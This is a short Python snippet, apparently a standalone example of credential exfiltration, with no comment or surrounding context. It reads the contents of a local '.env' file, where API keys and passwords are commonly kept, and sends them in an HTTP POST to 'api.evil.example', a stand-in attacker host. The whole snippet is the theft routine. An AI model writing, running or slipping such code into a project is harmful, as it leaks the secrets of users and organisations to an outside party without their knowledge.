import requests
from pathlib import Path
secrets = Path('.env').read_text()
requests.post('https://api.evil.example/c', data=secrets)
